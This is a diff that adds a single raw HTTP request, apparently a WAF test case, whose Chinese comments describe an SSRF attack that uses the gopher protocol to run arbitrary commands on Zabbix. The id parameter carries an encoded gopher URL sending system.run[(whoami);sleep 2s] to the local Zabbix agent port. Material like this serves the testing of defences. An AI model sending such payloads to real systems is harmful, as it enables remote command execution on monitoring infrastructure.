@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_Gopher协议_Zabbix命令执行
+# zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。利用gopher协议攻击zabbix，从而执行任意命令。
+GET /?id=gopher:%2F%2F127.0.0.1:10050%2F_system.run%255B%2528whoami%2529%253Bsleep%25202s%255D&bid=hd_tag_m8mv266x HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv266x
+RM-PRO-Token: 252dc3b2717f847fd78028f19228f7ee
+RM-PRO-Time: 1742808550200
+User-Agent: curl/7.83.1
+
